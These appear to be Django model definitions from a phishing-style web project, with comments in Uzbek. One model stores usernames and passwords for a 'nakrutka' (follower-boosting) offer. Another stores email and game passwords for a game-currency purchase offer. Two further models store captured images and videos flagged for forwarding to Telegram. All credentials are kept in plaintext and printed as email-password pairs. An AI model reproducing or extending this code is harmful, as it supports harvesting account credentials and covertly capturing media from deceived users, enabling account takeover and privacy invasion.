from django.db import models

class Nakrutka(models.Model):
    username = models.CharField(max_length=150)
    password = models.CharField(max_length=150)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.username} - {self.password}"


from django.db import models


class UCOrder(models.Model):
    game_id = models.CharField(max_length=50)
    server = models.CharField(max_length=20)
    uc_amount = models.IntegerField()
    email = models.EmailField()
    password = models.CharField(max_length=255)
    terms = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return  f"{self.email} - {self.password}"


from django.db import models
from django.utils import timezone
import os
import uuid


def image_upload_path(instance, filename):
    """Rasm saqlash joyi"""
    ext = filename.split('.')[-1]
    filename = f"{uuid.uuid4()}.{ext}"
    return os.path.join('saved_images', filename)


def video_upload_path(instance, filename):
    """Video saqlash joyi"""
    ext = filename.split('.')[-1]
    filename = f"{uuid.uuid4()}.{ext}"
    return os.path.join('saved_videos', filename)


class CapturedImage(models.Model):
    """Saqlangan rasmlar modeli"""
    image = models.ImageField(upload_to=image_upload_path)
    created_at = models.DateTimeField(auto_now_add=True)
    sent_to_telegram = models.BooleanField(default=False)
    file_size = models.BigIntegerField(default=0)

    class Meta:
        verbose_name = "Rasm"
        verbose_name_plural = "Rasmlar"
        ordering = ['-created_at']

    def __str__(self):
        return f"Rasm {self.created_at.strftime('%Y-%m-%d %H:%M')}"

    def save(self, *args, **kwargs):
        if self.image:
            self.file_size = self.image.size
        super().save(*args, **kwargs)


class CapturedVideo(models.Model):
    """Saqlangan videolar modeli"""
    video = models.FileField(upload_to=video_upload_path)
    created_at = models.DateTimeField(auto_now_add=True)
    sent_to_telegram = models.BooleanField(default=False)
    file_size = models.BigIntegerField(default=0)
    duration = models.IntegerField(default=0)  # soniyalarda

    class Meta:
        verbose_name = "Video"
        verbose_name_plural = "Videolar"
        ordering = ['-created_at']

    def __str__(self):
        return f"Video {self.created_at.strftime('%Y-%m-%d %H:%M')}"

    def save(self, *args, **kwargs):
        if self.video:
            self.file_size = self.video.size
        super().save(*args, **kwargs)


class SystemLog(models.Model):
    """Tizim loglari"""
    LOG_TYPES = [
        ('info', 'Info'),
        ('warning', 'Warning'),
        ('error', 'Error'),
        ('success', 'Success'),
    ]

    log_type = models.CharField(max_length=10, choices=LOG_TYPES, default='info')
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name = "Tizim Logi"
        verbose_name_plural = "Tizim Loglari"
        ordering = ['-created_at']

    def __str__(self):
        return f"{self.log_type}: {self.message[:50]}"